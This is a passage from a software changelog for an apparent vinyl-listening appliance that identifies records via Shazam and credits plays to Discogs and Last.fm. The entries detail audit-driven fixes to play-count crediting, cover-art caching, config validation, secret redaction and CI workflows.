  confirmation broke the consecutive dedup) and Last.fm's server-side dedup
  doesn't collapse the two scrobbles (distinct timestamps). The scrobble sink
  now shares the same per-spin memory (`should_scrobble`/`record_scrobble`,
  consulted by TrackCommitService — wiring pinned by its own test), cleared at
  the same silence boundary, with a #185 re-dropped release's keys dropped so a
  genuine replay scrobbles again.
- **A locked groove can no longer mint one phantom credit per hour (#350 /
  R8-16).** The #195 safety net now emits `SESSION_ENDED_FORCED` (a new
  AudioEvent): the tracker ends and credits the session identically, but a
  forced end is NOT a physical spin boundary (music never stopped), so the
  per-spin memory survives and the groove's re-armed closer is suppressed until
  the needle actually lifts.
- **An armed session is no longer silently discarded at shutdown (#351 /
  R8-17).** `drain()` now detaches a live ARMED session (closer played, coverage
  complete, waiting out the silence window) and finalizes it behind the same
  gates as any end — a `systemctl stop` right after a record finishes keeps the
  credit; the completion gate still suppresses a phantom, and a session already
  ended is not re-credited. An unarmed live session is still discarded
  (debug-logged).
- **The `_prev_unarmed` chain invariant is true again (#349 / R8-15).** An
  unarmed split-detached session bypassed `_finalize_session` via the #166
  short-circuit and left a STALE prior-unarmed session inheritable. The chain
  now ends at an unarmed split-detach (a split is attribution noise inside
  continuous music, not a flip — conservative, missed-over-phantom), and the
  documented invariant matches the code.

### Added

- **`tests/test_credit_cadence_r8.py` (#347 / R8-04)** — the realistic-cadence
  harness: 17 scenario tests at the real 15s/10s/2-confirm/45s timeline on a
  tracker-scoped fake monotonic clock. Two harness rules are documented in the
  file and testing-guide.md, both learned by hitting them: patching
  `time.monotonic` globally freezes asyncio's own loop clock (hangs every
  await), so the clock is patched as `src.tracking.listen_tracker.time`; and
  `PlaySession.started_at`'s default_factory bound the real function at class
  definition, so tests stamp it explicitly.

### Changed

- `ListenTracker` no longer takes `session_end_silence_seconds` — the credited
  memory is silence-boundary keyed, not wall-clock windowed, so the injection
  (main.py) is gone with it.
- `AudioEvent` gains `SESSION_ENDED_FORCED`; the two #195 forced-end tests now
  pin that the forced end is NOT reported as a genuine-silence SESSION_ENDED.
- **Dependency floors raised to the currently-tested releases (Dependabot
  #309–#313).** `requirements.txt` `>=` floors bumped to match what a fresh install
  already resolves and what the suite validates: `sounddevice>=0.5.5`,
  `shazamio>=0.8.1`, `urllib3>=2.7.0,<3.0.0` (the `<3` S-7 cap retained),
  `pylast>=7.1.0`, `pytest>=9.1.1`. No install-time change (the floors were already
  satisfied by the newest release); this documents the tested minimum and lets pip
  fail-closed if a newest release is ever yanked. Full suite green on these exact
  versions. The five Dependabot pip PRs are bundled here and auto-close on the floor
  bump; the two GitHub-Actions SHA bumps (checkout, setup-python) are merged
  separately.

## [1.5.26] — 2026-08-12

**Round-8 cleanup wave — the backlog opened during Rounds 6–7 (#304, #305, #306,
#343, #344).** Five carried-over issues: an oversized-cover downscaler (so a large
CAA scan shows instead of blanking), two cover-state memory-hygiene fixes, a genre-
chip clip, a capture-throttle key coarsening, and a doc re-correction. RED-first and
mutation-verified for the code fixes; an independent break-this cold review found a
**critical memory regression in the first cut of #305** (see below) — reworked,
re-measured, and a narrow second pass converged clean before ship. Full suite
**1403 passed**.

### Fixed

- **An oversized-but-legitimate cover is downscaled instead of blanked (#305 —
  MEDIUM).** A high-res Cover Art Archive scan above the ~10 MP display cap but under
  the 36 MP bomb ceiling used to be rejected outright — blanking the cover and making
  the R6-18 self-heal re-download the same large file up to 5×. It is now reduced-
  decoded and downscaled at cache-write. **Memory safety:** the reduced decode is
  bounded by drafting the JPEG to a small box (`_DRAFT_TARGET_SIDE`), so the decode
  never exceeds the cap regardless of the source's true size; the post-draft size is
  re-checked before any pixels are materialized, and a cover that resists reduction
  (wider than roughly square) or an oversized non-JPEG (no `draft()` path) is rejected
  rather than risk the full-resolution decode. ⚠️ The first implementation drafted to
  the *display cap*, where `draft()` never engages for a 6000×6000 source — it decoded
  the full 36 MP (~400 MB RSS, the R6-20 OOM). Caught by the cold audit and corrected;
  peak RSS on that exact input is now ~116 MB (in line with a normal cover). A new
  `PermanentCoverError` (a `ValueError`) lets the download leg blacklist a definitively
  bad cover immediately instead of retrying the same bytes 5×.
- **The cover download-failure bookkeeping no longer grows unbounded (#306 — LOW).**
  On a track change the outgoing cover's transient failure/back-off/decode-failure
  entries are swept, and the download-failure blacklist branch pops the two download
  dicts it supersedes. (`_cover_bad_urls`, the permanent blacklist, is deliberately
  retained.) *Correction (R8-05/#356, v1.5.29): as shipped here the sweep ran only
  on a DIRECT track change; the common PLAYING→IDLE→PLAYING album boundary never
  swept, so the headline claim did not hold in practice until v1.5.29 added the
  IDLE-path sweep.*
- **An over-wide genre chip is clipped to its column (#344 — LOW).** `_draw_genre_chips`
  now blits each chip with a horizontal `area` clip to the column's right edge, so a
  chip wider than the remaining space is trimmed rather than overflowing the card.
- **The capture-error log throttle keys on the error *class*, not the full message
  (#304 — LOW).** A same-type error whose message varies every occurrence (an
  embedded errno, address, or timestamp) used to mint a fresh throttle key each time,
  defeating the anti-flood suppression and unbounding the key map. It now keys on
  `type(error).__name__`; the full message still prints on the surfaced line.

### Documented

- **The Dependabot / CI-drift docs are re-corrected (#343 — the R7-24 regression).**
  The v1.5.25 note wrongly claimed Dependabot opens no pip PR for a satisfied `>=`
  floor. It does — its `increase` strategy raises the floor to the newest release
  (the repo's own open pip PRs prove it). `dependabot.yml`, `tests.yml`, and the
  v1.5.19/v1.5.25 CHANGELOG entries now state that Dependabot is the floor-drift
  surfacer and the weekly cron is the complementary "does the new release break the
  suite" guard.

## [1.5.25] — 2026-08-12

**Round-7 audit — Wave 6: CI, docs & matching residue (milestone "R7 Wave 6",
#335–#342) — completes Round 7.** A CI-workflow correctness pass, a matching-regex
fix, a resolver-memo hardening, and doc/comment corrections. RED-first for the two
code fixes (both mutation-verified); independent break-this cold review (SPEC +
QUALITY pass); full suite **1391 passed**.

### Fixed

- **The release-consistency workflow no longer contradicts the badge workflow
  (#335 — MEDIUM, `R7-22`).** It validated `VERSION` with a strict
  `MAJOR.MINOR.PATCH` regex while `sync-version-badge.yml` accepts a `-rc1`
  pre-release suffix, so a pre-release tag could never satisfy both. It now uses
  the same pattern, and its tag trigger is tightened from `v*` (which fired on
  non-release tags like `v2-experiments`) to `v[0-9]*`.
- **The test-suite workflow's schedule and pushes no longer cancel each other
  (#336 — MEDIUM, `R7-23`).** A `schedule` run executes with
  `github.ref = refs/heads/main`, so it shared one cancel-in-progress concurrency
  group with main-branch pushes — the Monday cron could kill an in-flight push run,
  and a push could silently void the weekly drift check. The group now includes
  `github.event_name`.
- **A hyphenated trailing decoration is now stripped for matching (#338 — LOW,
  `R7-25`).** `_TRAILING_DASH_RE` forbade any hyphen inside the dash segment, so
  `"… - Re-Recorded Version"` / `"… - Hi-Res Version"` never stripped — a permanent
  missed collection match for that record class. It now anchors to the last `" - "`
  and captures the whole tail; the decoration-keyword gate is unchanged, so no
  ordinary interior dash is over-stripped.
- **The database-search memo publishes its data before its key (#339 — LOW,
  `R7-26`).** Defence-in-depth on the 2-worker Discogs pool: page + stamp are set
  before the key that flags the memo ready, so a reader can never get one query's
  page under another query's key. (The reader path is single-caller / resolver-
  serialized today, so this is not a lock — documented as such.)
- **The full-credit key handles an empty-string artist credit (#341 — NIT,
  `R7-28`).** R6-16 tested `is None`, so an `artist_credit: ""` returned an empty
  key while its precompute counterpart reconstructed the names — a silent
  mismatch. Now reconstructs for both empties.

### Documented

- **CI/dependency-drift docs corrected (#337 — MEDIUM, `R7-24`).** ⚠️ **Partly
  WRONG — see #343 / v1.5.26.** This entry claimed Dependabot "raises no pip PR
  when the floor already admits the newest release"; that is false (Dependabot's
  `increase` strategy opens pip floor-bump PRs, as the repo's own open PRs show),
  and #343 re-corrects it. The accurate parts stand: the weekly cron auto-disables
  after 60 days of repo inactivity, and `workflow_dispatch` was added.
- **The CHANGELOG version-heading check is stricter (#342 — NIT, `R7-29`).** The
  grep interpolated the version into a regex where `.` is a wildcard; the dots are
  now escaped while keeping the start-of-line anchor.
- **The shutdown-drain note no longer overstates recovery (#340 — LOW, `R7-27`).**
  It claimed an abandoned-at-shutdown credit "is idempotent and lands on the next
  spin"; the abandoned play is permanently uncounted, and the next spin credits as
  a fresh play. Corrected to match the #187 drain decision.

## [1.5.24] — 2026-08-12

**Round-7 audit — Wave 5: ops & first-boot (milestone "R7 Wave 5", #329–#334).**
Closes the first-boot failure modes that crash-loop instead of parking cleanly,
adds startup detection for the shipped credential placeholders, plugs a
Ctrl+C secret-leak, and bounds the clock gate above as well as below. **Land
before Pi bring-up.** RED-first with executed repros; independent break-this cold
review (SPEC + QUALITY pass); the behavioural fixes mutation-verified; full suite
**1389 passed**.

### Fixed

- **An unreadable or mistyped `config.yaml` now parks at exit 78 instead of
  crash-looping (#329 — HIGH, `R7-16`).** `load_config` caught only
  `yaml.YAMLError`, so a `PermissionError` (a root-owned 600 file after a `sudo`
  edit — the likeliest slip now that setup guides say `chmod 600`), an
  `IsADirectoryError`, or a non-UTF-8 file escaped as a raw traceback → exit 1 →
  systemd churning `Restart=on-failure` into `start-limit-hit`. All are now caught
  and re-raised as a friendly `ConfigError`, which mains parks at EX_CONFIG (78).
- **The shipped Discogs credential placeholders are rejected at startup, not at
  runtime (#330 — MEDIUM, `R7-17`).** A config left with
  `YOUR_DISCOGS_TOKEN_HERE` / `your_discogs_username` validated clean and then
  401'd on every Discogs call — a systemd-healthy service that never worked. They
  now fail config validation (aggregated `ConfigError` → exit 78) so the operator
  gets one friendly message; the value is never echoed. (Last.fm placeholders keep
  their runtime graceful-degrade — scrobbling is optional.) *Ratification note
  (R8-21/#370, v1.5.31): #330's fix text also proposed unifying the Last.fm trio
  into the aggregated ConfigError; that clause was deliberately NOT implemented —
  scrobbling is an optional feature, and a fatal config error for an optional
  feature's placeholders would park a service whose core function works. The
  deviation was silent at ship time; ratified by Lane 2026-08-12.*
- **A broken recognition-backend install fails loud regardless of exception type
  (#331 — LOW, `R7-18`).** The import probe caught only `ImportError`; a broken
  native dependency raising `OSError` at import escaped. It now catches any
  import-time failure (still letting `KeyboardInterrupt` / `SystemExit` through).
- **The wall-clock trust gate now has a far-future ceiling (#332 — LOW,
  `R7-19`).** It was a lower bound only, so a glitched RTC reading years ahead
  passed and would stamp a future, unrecoverable Last Played / scrobble date. A
  century-high ceiling (never clips a real clock) now rejects garbage far-future
  readings too.
- **Ctrl+C no longer leaks a secret through the exception chain (#333 — LOW,
  security, `R7-20`).** A bare `KeyboardInterrupt` re-raise let Python's default
  excepthook render the whole `__context__` chain raw to stderr → journald; if the
  interrupt landed while a token-bearing Discogs error was in flight, the token
  leaked. The interrupt handler now scrubs-and-prints the chain, then re-raises a
  context-severed `KeyboardInterrupt` (SIGINT exit 130 preserved).

### Documented

- **A stale `RestartSec` comment is corrected (#334 — NIT, `R7-21`).** A
  `reader.py` comment said `RestartSec=10`; the shipped systemd unit is `15`.

## [1.5.23] — 2026-08-12

**Round-7 audit — Wave 4: cover state machine (milestone "R7 Wave 4",
#325–#328).** Stops a per-frame decode-spawn + blocking-stat churn when a cached
cover vanishes from disk, hardens the prune race, and pins the R6-18 self-heal
driver against a surviving mutant. RED-first with an executed churn repro;
independent break-this cold review (SPEC + QUALITY pass, no introduced bugs); the
two code fixes mutation-verified; full suite **1378 passed**.

### Fixed

- **A cover that vanishes from disk no longer churns the render loop for the rest
  of the album (#325 — MEDIUM, `R7-12`).** When the mtime-LRU pruned a cover still
  marked ready in `_cover_on_disk` (a warm-start cover's mtime is never refreshed,
  so it's the prune's first victim), the off-loop decode early-returned WITHOUT
  dropping the marker — so `_load_cover` respawned a blocking-`exists()`, no-op
  decode task every frame and the R6-18 retry driver stayed gated off. The decode
  now drops the stale marker and refetches (recovering the cover within the
  track); a cover that was never on disk still defers to the state-change prefetch.
- **A cover pruned mid-decode is no longer misfiled as corrupt (#326 — LOW,
  `R7-13`).** A file removed between the `exists()` check and the executor's
  `pygame.image.load` raised `FileNotFoundError`, which the corrupt-bytes handler
  treated as bad data — unlinking an already-gone file and burning an attempt
  toward a spurious blacklist a same-album track change could never lift. That
  race is now recognised as a vanished file (drop the marker + refetch, no decode
  tally).

### Testing

- **The R6-18 cover self-heal driver is now pinned (#327 — MEDIUM, `R7-14`).**
  Deleting the render loop's one `_maybe_retry_cover_download()` call previously
  left the whole suite green. A new integration test drives real render-loop
  iterations with an elapsed download backoff and asserts the retry fires — so
  removing the driver now fails fast.

### Documented

- **The `_prefetch_cover` blacklist comment covers both routes (#328 — NIT,
  `R7-15`).** It claimed a blacklisted URL "keeps its corrupt bytes on disk so
  `exists()` is true" — true for the decode-blacklist route, but the
  download-blacklist route leaves no bytes on disk. Corrected to describe both.

## [1.5.22] — 2026-08-12

**Round-7 audit — Wave 3: display fidelity (milestone "R7 Wave 3", #320–#324).**
Restores the designed letter-spacing the renderer was silently dropping from its
own labels, stops the catalog footer and the "+N" chip drawing outside their
bounds, and corrects stale colour-clamp docs and two render-loop comments.
RED-first with executed repros; independent break-this cold review (SPEC + QUALITY
pass); the two code fixes mutation-verified; full suite **1375 passed**.

### Fixed

- **The app's own labels get their designed letter-spacing back (#320 — HIGH,
  `R7-07`).** The DISP-5 shaping gate was `not text.isascii()`, but the renderer's
  labels are non-ASCII by construction — the mid-dot in `SIDE A · 04 OF 06`, the
  ellipsis in `STILL LISTENING…`, the arrows in `← PREV` / `NEXT →` — so every one
  was rendered as a single shaped run with NO tracking, on every frame since
  v1.5.5. A new `_needs_shaping` predicate shapes ONLY genuinely complex text
  (Arabic/Hebrew joining, Indic conjuncts, combining marks, emoji ZWJ/variation
  selectors); Latin (incl. precomposed diacritics), CJK, punctuation, and arrows —
  the labels included — keep their letter-spacing.
- **The catalog footer is ellipsized instead of hard-clipped mid-glyph (#322 —
  LOW, `R7-09`).** A `year · label · catalog` string wider than its column was
  blitted with a width clip that sliced the last glyph in half. It is now trimmed
  with a trailing … measured on the real letter-spaced width (`year · label · …`).
  Interacts with R7-07: restoring tracking widens footers, so this is fixed in the
  same wave.
- **The "+N" genre overflow chip can no longer draw below its box (#321 — LOW,
  `R7-08`).** `draw_chip` checked the vertical bound only inside its row-wrap
  branch and moved the cursor before the early return, so a chip that fit
  horizontally on an over-low row (or any chip at extreme push-down) blitted into
  the catalog footer's row. It now verifies the fit on every path and commits the
  cursor only when it draws; a chip that can't fit is suppressed rather than drawn
  out of bounds.

### Documented

- **The `muted` contrast-clamp docs match the code again (#323 — LOW, `R7-10`).**
  DESIGN.md, the renderer, and the palette module still said `muted` is clamped
  against the gradient's brightest pixel (or flat `bg`); since #206 it is clamped
  against solid `surface` — the status-strip fill it lands on, brighter than the
  gradient peak — while `accent` (the album title) is the role clamped against the
  gradient peak. Corrected at five sites.
- **Two render-loop comments corrected (#324 — NIT, `R7-11`).** The static-frame
  cache comment claimed the composite recomposes "each frame" during the palette
  lerp (it recomposes only when the quantized palette changes, P-4 — roughly a
  dozen-plus times per second, data-dependent); and the two cover-blacklist log
  lines said "giving up until the track changes" when a same-album track change
  reuses the URL and won't lift the blacklist — now "until a different cover is
  requested."

## [1.5.21] — 2026-08-12

**Round-7 audit — Wave 2: commit-pipeline availability (milestone "R7 Wave 2",
#319).** Stops a throttled album-split credit from stalling the whole recognition
pipeline, and corrects the comments (and a historical CHANGELOG line) that
overclaimed it never did. RED-first with an executed stall repro; independent
break-this cold review (which caught the uncorrected historical-CHANGELOG
overclaim and a comment imprecision, both fixed); fix mutation-verified; full
suite **1368 passed**.

### Fixed

- **A split credit honouring a long Discogs `Retry-After` no longer stalls the
  recognition pipeline for up to ~180s (#319 — MEDIUM, `R7-06`).**
  `on_track_identified` (the leg that processes audio chunks) awaited the
  creditable album-split finalize inline via an UNBOUNDED `await
  asyncio.shield(task)`. When that finalize honoured a Retry-After (#229, up to
  90s, up to twice), the leg blocked for the whole wait: no chunks processed, the
  maxsize-5 queue draining ~50s of audio and losing the next record's early
  tracks (lost scrobbles and #182 supporting rows — and raw material for the
  R7-02 cross-record swings). The inline wait is now bounded to
  `_SPLIT_CREDIT_INLINE_WAIT_SECONDS` (5s); a slow credit finishes in the
  background (already tracked in `_bg_tasks`, failure-logged, drained at
  shutdown). A normal credit still completes inline, so common-case timing is
  unchanged; the #187 shutdown-safety and #186 idempotency guarantees are
  preserved.

### Documented

- **The comments (and the historical 1.5.9/#229 CHANGELOG entry) that claimed the
  honoured wait "never stalls the next record's session" are corrected
  (`R7-06`).** They conflated the session START (never stalled — it runs outside
  the lifecycle lock, CONC-2) with the recognition LEG (which the inline await
  did block). The distinction is now explicit at each site.

## [1.5.20] — 2026-08-11

**Round-7 audit — Wave 1: the credit-evidence model (milestone "R7 Wave 1",
#314–#318).** Strengthens the album-completion gate so a compilation can no
longer mint a phantom credit for an owned album, stops one physical spin being
double-counted, and recovers a full play split by a mid-side pause. Design gate
approved by Lane (side-coverage / silence-window / flip-resume, 2026-08-11).
*Correction note (R8-13/#367, v1.5.31): this release ALSO changed sideless-
tracklist gating — the closer-identity check now precedes the ≥2-rows fallback,
so a sideless release with a FOREIGN armed closer is suppressed where it used
to credit — while the shipped docstring promised sideless behaviour was
"unchanged". Ratified as an intended missed-over-phantom extension by Lane
2026-08-12; the docstring now describes the real gate order.*
RED-first with the audit's executed repros; independent break-this cold review
(which caught the SESSION_ENDED double-credit gap, now fixed and pinned); each
fix mutation-verified; full suite **1366 passed**.

### Fixed

- **A compilation no longer mints a full album credit for the owned studio LP
  still in its sleeve (#314 — HIGH, `R7-01`).** The completion gate required ≥2
  distinct tracklist rows of the latched release, which a Best-Of defeats from
  the mirror direction: two of its tracks (the album's closer among them) resolve
  to the owned pressing (Shazam reports the original album), arming a phantom
  full-album Play Count + Last Played + love. The gate is now **side-coverage** —
  every vinyl row sharing the closer's side letter must be identified this
  session. Carve-outs: a one-row closing side is covered by the closer alone; a
  sideless (numbered / CD-only) tracklist falls back to the prior ≥2-rows rule.
  R5-05 preserved (the closer must belong to the latched release). Strictly
  stronger, accepting the missed-credit cost of weak closing-side recognition
  (missed-over-phantom).
- **One physical spin is no longer double-credited when Shazam's attribution
  ping-pongs between two records (#315 — HIGH, `R7-02`).** A foreign
  mis-identification mid-spin splits the session and credits the armed release;
  when the attribution swings back and re-arms, the next swing (or the spin's own
  end) credited it AGAIN — +2 Play Count for one play, which the #185 and #186
  guards (within-session / within-finalize) could not see across the fresh
  sessions a split mints. The tracker now keeps a `(release_id → credited_at)`
  memory and suppresses a duplicate credit within `session_end_silence_seconds`
  unless the session was opened by a genuine #185 re-drop — guarding **both** the
  split and the terminal SESSION_ENDED credit paths (and the matching love).
- **A full album played through a mid-side pause now credits instead of being
  silently dropped (#316 — MEDIUM, `R7-03`).** A multi-row closing side split by
  a silence gap longer than `session_end_silence_seconds` (a sleeve-cleaning
  pause) left the armed session holding only the tail of the side — the
  mis-attributed-single signature — so the whole play was suppressed. The armed
  session now **inherits** the immediately-prior unarmed session's closing-side
  rows, bounded to a 5-minute window (same closing side, same release). A
  side-long closer (one-row closing side, e.g. *Meddle*'s "Echoes") is already
  handled by the side-coverage carve-out.
- **`PlaySession.started_at` is no longer dead state (#318 — NIT, `R7-05`).** It
  is now the recency anchor for the R7-03 flip-resume window.

### Documented

- **The `_same_track` dedup's cross-record cost is acknowledged (#317 — LOW,
  `R7-04`).** Recognition dedup compares title + artist only (never the unstable
  album field, by design): a genuine record change whose boundary track shares
  the previous track's title AND artist is swallowed until the next
  differently-named track. Reproduced and kept as-is — re-including album would
  trade a rare, self-healing miss for frequent per-chunk re-resolve churn — with
  the tradeoff now documented in the method.

## [1.5.19] — 2026-08-11

**Round-6 audit — Wave 6: docs, CI & supply chain (milestone #36) — completes
Round 6.** Documentation accuracy, setup-guide secret hygiene, and CI /
supply-chain hardening. Cold-reviewed (SPEC + QUALITY pass; doc claims
grep-verified against the code, workflow logic executed).

### Fixed

- **The setup guide no longer instructs pasting Last.fm secrets onto the shell
  command line (#294 — MEDIUM, security, `R6-29`).** §8d's connection check now
  reads the three credentials from `config.yaml` (like the Discogs check) instead
  of taking them as `python -c` arguments, so they never land in `~/.bash_history`,
  scrollback, or `ps`.
- **Supply-chain drift is caught in CI, not at bring-up (#295 — MEDIUM, security,
  `R6-30`).** `requirements.txt` is floor-pinned (`>=`), so a breaking/compromised
  release lands on the Pi silently. A new `dependabot.yml` opens weekly PRs
  bumping the pip `>=` floors (Dependabot's `increase` strategy) and the SHA-pinned
  GitHub Actions, plus security advisories; the `tests.yml` weekly cron
  complements it by reinstalling the tree and failing the suite if a new release
  actually breaks something. _(An R7-24/v1.5.25 note wrongly claimed Dependabot
  opens no pip PR for a satisfied `>=` floor — corrected in #343/v1.5.26; the open
  pip floor-bump PRs disprove it. GitHub disables a schedule after 60 days of repo
  inactivity, so keep the cron alive via a push or `workflow_dispatch`.)_
- **`config.yaml`'s two write-scope secrets get file permissions (#301 — LOW,
  security, `R6-36`).** `chmod 600 config.yaml` added to the setup guide §7 and the
  README quick start — `cp` leaves it world-readable under the default umask.
- **Release consistency is enforced (#299 — LOW, `R6-34`).** A new
  `release-consistency.yml` fails a `v*` tag push unless the tag, `VERSION`, and
  the `CHANGELOG.md` heading all agree (read-only, injection-safe) — the guard the
  2026-08-10 badge-rot incident showed was missing.
- **CI runs once per change and Python 3.12 is actually tested (#298, #302 — LOW,
  `R6-33` / `R6-37`).** `tests.yml` narrows `push` to `main` (+ `pull_request`),
  adds a `concurrency` group that cancels superseded runs, and adds `3.12` to the
  version matrix (the setup guide claimed 3.12 works but it was tested nowhere).
- **The `_SecretRedactingFilter` "never drop a record" comment corrected (#303 —
  NIT, `R6-38`).** A malformed-format record IS deliberately dropped three lines
  above; the comment now says so.

### Documentation

- **Stale and missing operational notes corrected (#296, #297, #300 — LOW,
  `R6-31` / `R6-32` / `R6-35`).** Documented the #229 long-Retry-After × 10s-drain
  shutdown interaction beside the `TimeoutStopSec` prose; corrected the
  first-boot-checklist and `architecture.md` wording that still called the #61
  executor work "deferred" / a "shared pool" (it shipped a dedicated 2-worker
  Discogs pool + an 8-worker I/O pool); and added a troubleshooting note that a
  clean ESC / window-close exit under `Restart=on-failure` leaves the screen dark
  until a manual restart.

---

_Round 6 complete: all 38 findings (#266–#303) remediated across six waves
(v1.5.14–v1.5.19), each RED-repro-first, mutation-pinned where code, and
cold-reviewed._

## [1.5.18] — 2026-08-11

**Round-6 audit — Wave 5: ops hardening (milestone #35).** Config diagnostics,
credential + secret hygiene, and a realtime-thread logging fix. RED-repro-first,
every fix mutation-pinned, cold "break-this" reviewed (SPEC + QUALITY pass).

### Fixed

- **Typo'd config keys are surfaced instead of silently ignored (#289 — MEDIUM,
  `R6-24`).** A misspelled key (`scrobble_enable`, `lastfmm`, `overlap_secondss`)
  was accepted, the field silently took its default, and nothing said so — for
  Last.fm that meant zero scrobbles with zero journal evidence. Each config
  section (and the top-level section list) now logs a WARNING for any unrecognised
  key with a did-you-mean; the keys stay tolerated (the reserved
  `recognition.acrcloud`/`audd` sub-sections don't warn). The "scrobbling
  disabled" notice is promoted DEBUG→INFO so it's visible at the shipped log level.
- **Placeholder Last.fm credentials no longer log a false success (#290 — LOW,
  `R6-25`).** With the `config.example.yaml` placeholders and
  `scrobble_enabled: true`, the client logged "scrobbling initialised" and then
  every scrobble failed at runtime. Placeholder credentials are now detected and
  scrobbling is disabled with a clear warning.
- **Unhandled-exception tracebacks are scrubbed of secrets (#291 — LOW, security,
  `R6-26`).** The #202 redaction filter covers log records, but an uncaught
  exception's traceback bypasses logging entirely (Python prints it raw to stderr
  → journald) — and discogs-client carries the token in request URLs. The entry
  point now renders any uncaught traceback through the same secret scrub before it
  reaches stderr, then exits non-zero. `SystemExit` / `KeyboardInterrupt` pass
  through untouched.
- **A permanently-bad config parks instead of crash-looping (#292 — LOW,
  `R6-27`).** A `ConfigError` (missing/typo'd key, out-of-range value, an
  unimplemented backend, or the recognition backend failing to import) now exits
  `78` (`EX_CONFIG`), and the documented systemd unit gains
  `RestartPreventExitStatus=78` — so systemd stops restarting a fault that can
  never self-heal (each cold start re-pages the whole Discogs collection index). A
  transient crash still restarts as before.
- **The PortAudio input-status warning is off the realtime thread and throttled
  (#293 — LOW, `R6-28`).** A persistent input-overflow flag logged ~4×/second on
  the realtime audio callback thread, where blocking log I/O can itself worsen the
  overrun. The status is now marshalled onto the event loop and throttled there
  (per distinct flag), like the drop-oldest warning.

## [1.5.17] — 2026-08-11

**Round-6 audit — Wave 4: cover pipeline resilience (milestone #34).** How cover
art and its palette recover from transient failures, a decompression-bomb
tightening, and an import side-effect. Design signed off (time-based download
backoff; ~10 MP cap). RED-repro-first, mutation-pinned, cold "break-this" reviewed
(one HIGH caught in review, fixed + regression-tested; final SPEC + QUALITY pass).

### Fixed

- **A transiently unreadable cover no longer poisons its palette to FALLBACK for
  the whole session (#282 — MEDIUM, `R6-17`).** `extract_palette` returned
  `FALLBACK_PALETTE` on any error and `_extract_palette_async` cached it, so the
  cache-hit short-circuit never re-extracted — even after the corrupt-cover
  refetch landed good bytes. `extract_palette` now returns `None` on failure and
  the failure is not cached, so dynamic theming recovers on the refetch.
- **A transient download blip no longer blanks the cover for the rest of the album
  (#283 — MEDIUM, `R6-18`).** Every track on an album shares one cover URL, so the
  old "blacklist until the track changes" never lifted within the album. A
  download failure now backs off (~30s) and retries — the render loop re-attempts
  once the window elapses — and only a persistently-dead URL (5 failures) is given
  up on. Decode failures keep their existing bounded unlink→refetch→blacklist.
- **The corrupt-cover refetch no longer reopens the per-frame decode churn (#284 —
  LOW, `R6-19`).** `_handle_corrupt_cover` discards the URL from the on-disk
  readiness set right after unlinking, so no decode task is spawned during the
  refetch window; the refetch re-adds it when good bytes land.
- **A decompression bomb can no longer OOM the Pi (#285 — MEDIUM, `R6-20`).**
  `MAX_IMAGE_PIXELS` lowered from 36 MP to ~10 MP (3200×3200); `cover_cache`
  validates at cache-write, so an oversized image is rejected before it is ever
  stored, decoded (×3), or rendered. Real covers (~9 MP) are unaffected.
- **A cover abandoned mid-download no longer leaks a readiness marker (#287 — NIT,
  `R6-22`).** `_prefetch_cover` marks readiness / repaints only when the finished
  download is still the wanted cover; a download that completed for a
  since-changed track no longer adds an on-disk marker that would never be
  discarded.
- **Download and decode failures no longer share one tally (#288 — NIT, `R6-23`).**
  Separate tallies so a download blip can't consume the corrupt-decode path's
  bounded retry budget. A cold-review catch: a clean download must NOT reset the
  decode tally — a download-clean / decode-corrupt cover (Pillow-accepts,
  SDL-rejects) would otherwise loop the unlink→download→decode-fail storm forever;
  the decode bound now persists across refetches.

### Changed

- **The MusicBrainz socket-timeout floor is applied on construction, not at import
  (#286 — LOW, `R6-21`).** `socket.setdefaulttimeout` moved from `coverart.py`'s
  import into `CoverArtFallback.__init__` (guarded), so importing the module no
  longer silently changes process-wide socket behaviour for every module imported
  after it.

## [1.5.16] — 2026-08-11

**Round-6 audit — Wave 3: matching reach (milestone #33).** Systematic missed
collection matches + memo staleness. RED-repro-first, every fix mutation-pinned,
cold "break-this" reviewed (SPEC + QUALITY pass).

### Fixed

- **Apple/Shazam's "Title - Single" dash form now matches an owned 45 (#279 —
  MEDIUM, `R6-14`).** `strip_album_decoration` iterated only the paren and bracket
  forms, so the standard dash rendering Apple uses for singles/EPs
  ("Blinding Lights - Single") never stripped — even though "single" is already in
  the album decoration vocabulary — and a whole class of owned 7"/12" records was
  never matched (no instance_id → no Play Count, ever). The keyword-gated dash form
  now strips like the paren/bracket ones; "- EP" is deliberately left alone ("ep"
  isn't in the vocabulary — an album can be titled "... EP"), and a dash segment
  with no decoration keyword ("Money - It's a Gas") is untouched. This extends the
  same bounded, uniqueness-gated decorated-query residual as the paren/bracket
  forms (#222) to the dash form.
- **The one-entry database-search memo expires (#280 — LOW, `R6-15`).** The R5-20
  memo that collapses the 2–3 identical searches within one resolve had no TTL, so
  on a 24/7 appliance re-playing the same record hours later it replayed a stale
  (possibly empty) page — pinning a coverless FALLBACK result past the record's
  later addition to the Discogs database. It now expires after 60s (well beyond any
  single resolve, so the intra-resolve dedup is fully preserved) and re-fetches.
- **Names-only credit-key fallback strips the disambiguator per name (#281 — NIT,
  `R6-16`).** A hand-built (pre-precompute) index entry's credit key joined raw
  names then applied only the end-anchored "(n)" strip, so a mid-string
  "John (2) and Jane" kept its disambiguator where the precompute path yields
  "john and jane". The fallback now strips per name before joining, mirroring the
  precompute path the two are documented to share. (Production always precomputes;
  this aligns the test-only fallback.)

## [1.5.15] — 2026-08-11

**Round-6 audit — Wave 2: credit correctness — write path & session state
(milestone #32).** Data-integrity fixes to when a Play Count is credited and a
Last.fm love fires, plus session-state and observability nits. RED-repro-first
(the HIGH double-credit reproduced before the fix), every behavior fix
mutation-pinned, cold "break-this" reviewed (SPEC + QUALITY pass, no introduced
defect).

### Fixed

- **Single-(vinyl-)row release: one physical play no longer credits the Play
  Count TWICE (#270 — HIGH, `R6-05`).** On a one-row release the sole row is both
  opener and closer, so a confirmed foreign mis-attribution mid-spin — which
  breaks the consecutive-dedup chain — let the still-playing single's own
  re-identification trip the #185 replay boundary → split → carve-out credit →
  re-arm → a SECOND credit for ONE spin. Single-playable-row releases are now
  EXEMPT from the replay split (opener and closer are indistinguishable there); two
  spins of a single in one sitting credit once, the singles analogue of the
  accepted #227 bookend residual.
- **The Last.fm love no longer fires on a lone unlatched (DB-tier) closer (#271 —
  MEDIUM, `R6-06`).** The love reused `completion_supported`, whose
  `album_release_id is None` escape hatch — there for the credit fallback branch —
  returned True, so an unowned / DB-resolved album whose closer identified once,
  with zero supporting rows, got Loved on session end. A new `love_supported` gate
  requires ≥2 distinct resolved rows of the closer's own release when unlatched
  (keeping the genuine single-row carve-out); latched sessions defer to
  `completion_supported` unchanged.
- **A hybrid LP+CD with one side-long vinyl piece can be credited again (#272 —
